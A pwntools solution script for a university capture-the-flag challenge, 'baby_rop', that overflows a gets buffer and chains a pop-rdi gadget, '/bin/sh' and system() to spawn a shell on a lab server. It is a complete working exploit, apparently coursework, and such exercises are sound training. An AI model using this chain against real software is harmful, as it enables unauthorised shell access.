from pwn import *

context.log_level = "DEBUG"
context.terminal = ["tmux", "splitw", "-f", "-h"]

CHALLENGE = "baby_rop"
PORT = 1201
NETID = b"os2178"
LOCAL = False
if LOCAL:
    p = process(CHALLENGE)
else:
    p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", PORT)
    p.recvuntil(b"NetID (something like abc123): ")
    p.sendline(NETID)

e = ELF("./baby_rop", checksec=False)
p.recvuntil(b"> ")

r = ROP(e)

#get addresses of "/bin/sh" and system
bin_sh = next(e.search(b"/bin/sh"))
system = e.symbols.system

# print("rdi gadget: ", r.rdi)
# print("binsh", bin_sh)

chain = [
    r.rdi.address, # pop rdi gadget
    bin_sh, # pop into rdi
    r.ret.address, # align stack
    system # pop address of system into pc
]

# send '\n' for gets
p.sendline(b'A' * 24 + b"".join([p64(e) for e in chain]))
p.interactive()